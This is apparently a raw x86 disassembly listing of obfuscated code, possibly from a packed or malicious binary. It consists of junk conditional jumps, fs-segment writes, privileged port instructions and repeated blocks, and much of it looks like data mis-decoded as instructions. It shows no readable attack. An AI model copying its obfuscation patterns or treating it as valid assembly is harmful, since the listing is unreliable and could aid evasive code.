and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403047
pop ecx
pop edx
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
add edx 0xff108f0f
pop edx
mov eax 0xff55870f
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
ja 0xffffffff89a46d31
jg r-xdata
and ebx 0xff5a870f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop edx
pop edx
jae r-xdata
jne r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jae r-xdata
ja r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
ja r-xdata
jge 0x71fc6fd3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
add [ eax ] al
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jno r-xdata
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov ebx 0xf04c483
jae r-xdata
ja 0xffffffffa3c34090
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
pop eax
ja r-xdata
xor edx 0x880f5e7f
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
jne r-xdata
or edx 0xf3812e79
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jg r-xdata
ja 0xffffffffff9bb34d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
pop ecx
jns r-xdata
jno 0xffffffff874f6633
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jno r-xdata
and ebx 0x870f4975
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
ja r-xdata
xor ebx 0xff3d870f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
jmp 0xffffffffff79b18e
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
add esp 0x4
jae r-xdata
jl 0xf3b428
jg r-xdata
add eax 0x5abb2979
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
jno r-xdata
jae 0xffffffff8428ab9d
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_403097
ja r-xdata
jno r-xdata
jl 0x2f28ccf8
jno r-xdata
jl 0xfffffffff6c1ee5b
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff81500d06
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a46d31
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79b18e
ja r-xdata
jge 0x71fc6fd3
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc16eba
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jae r-xdata
add edx 0xff108f0f
call sub_403047
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f8b9f
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f665
add [ eax ] al
dec ecx
pop ecx
jno r-xdata
call 0xf44f8d9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jae r-xdata
call sub_40325c
jb 0xffffffff81b2af12
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2b380
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa6c0
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
jne r-xdata
jbe 0xffd03a4
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f6633
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jge 0xffffffffffa0b6e3
add esp 0x4
jae r-xdata
jl 0xf3b428
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_403102
jae 0xffffffffff43b927
xor ecx 0x890fd079
or esi 0xff24810f
jge r-xdata
jpe 0x74cd42e7
pop eax
jg r-xdata
jge 0xffffffff894f8b21
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
and eax 0x4c48358
ja r-xdata
jno 0xffffffffe89185be
push 0x81ffffff
out 0x77 al
jne r-xdata
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub esp 0x28
pop ecx
pop edx
sub ebx 0xff2f850f
jns 0x158b682
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
push edi
call sub_403354
jg 0xfffffffff0b38d7b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133c1fe
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jno r-xdata
jae 0xffffffff8428ab9d
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662877
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8d51
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
je 0xffffffffff6db76f
jge r-xdata
les ecx [ eax ]
jae r-xdata
call 0xffffffff854f8d8b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95d02c
jo 0xffffffffa2c1423f
push ecx
push edx
call sub_403324
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16681
push edx
call sub_4032c0
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40333b
jo 0xff9a928
jo 0xffffffff894f8d65
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_4032fe
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
push esp
push eax
call sub_4033a4
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b8af
push esp
pushfd
push ecx
sub esp 0xc
call sub_403321
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4030cb
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81cea630
pop eax
jns r-xdata
jno 0xffffffffefc16eba
out dx eax
jae r-xdata
jne 0xffffffffe3c212c9
push ecx
push edx
push ebp
sub esp 0x4
call sub_403097
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1ba00
ja r-xdata
jge 0x71fc6fd3
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3b7cc
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1ee5b
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_4030d4
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffca96a
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a46d31
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2b380
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1af95
pop ecx
jns r-xdata
jno 0xffffffff874f6633
pushfd
push esi
call sub_4030cb
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_4031e5
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
jno r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacc0f8
jae r-xdata
ja 0xffffffffa3c34090
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdeb676
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
inc eax
add [ ebx + 0x5a5928ec ] al
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff93aee
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403465
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push edx
push esp
push edx
call sub_4030f7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f6aa
jg r-xdata
ja 0xcab4a6
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f5b0
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9bb34d
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
